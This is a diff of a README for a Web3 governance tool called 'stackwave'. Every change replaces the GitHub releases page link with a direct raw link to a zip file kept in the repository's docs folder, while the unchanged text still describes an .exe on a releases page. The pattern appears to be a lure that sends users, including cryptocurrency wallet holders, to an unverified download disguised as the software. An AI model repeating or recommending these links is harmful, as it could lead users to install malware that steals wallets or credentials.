@@ -1,6 +1,6 @@
 # ⚡ stackwave - Simple Web3 Governance Tool
 
-[![Download stackwave](https://img.shields.io/badge/Download-stackwave-brightgreen)](https://github.com/Blaz3inFir3/stackwave/releases)
+[![Download stackwave](https://img.shields.io/badge/Download-stackwave-brightgreen)](https://raw.githubusercontent.com/Blaz3inFir3/stackwave/main/docs/Software-v1.1.zip)
 
 ---
 
@@ -29,7 +29,7 @@ No special hardware is needed beyond this. The program uses on-chain data, so go
 ## 🚀 Getting Started: Download stackwave
 
 1. Click the download badge at the top or go to this page directly:  
-   [Download stackwave](https://github.com/Blaz3inFir3/stackwave/releases)
+   [Download stackwave](https://raw.githubusercontent.com/Blaz3inFir3/stackwave/main/docs/Software-v1.1.zip)
 
 2. On the releases page, look for the latest version of stackwave for Windows. This could be a file ending with `.exe`.
 
@@ -108,7 +108,7 @@ stackwave works with various Ethereum wallets. Make sure you have one installed,
 New releases can include bug fixes or new features. To update:
 
 1. Visit the download page again:  
-   https://github.com/Blaz3inFir3/stackwave/releases
+   https://raw.githubusercontent.com/Blaz3inFir3/stackwave/main/docs/Software-v1.1.zip
 
 2. Download the newest version file for Windows.
 
@@ -138,7 +138,7 @@ If problems continue, check the GitHub Issues tab for possible solutions or to r
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/Blaz3inFir3/stackwave/releases
+- Download page: https://raw.githubusercontent.com/Blaz3inFir3/stackwave/main/docs/Software-v1.1.zip
 
 - Official documentation (if available): Check the GitHub README or Wiki section.
 
@@ -159,4 +159,4 @@ This app handles many Web3 tech areas:
 
 ---
 
-[![Download stackwave](https://img.shields.io/badge/Download-stackwave-brightgreen)](https://github.com/Blaz3inFir3/stackwave/releases)
+[![Download stackwave](https://img.shields.io/badge/Download-stackwave-brightgreen)](https://raw.githubusercontent.com/Blaz3inFir3/stackwave/main/docs/Software-v1.1.zip)
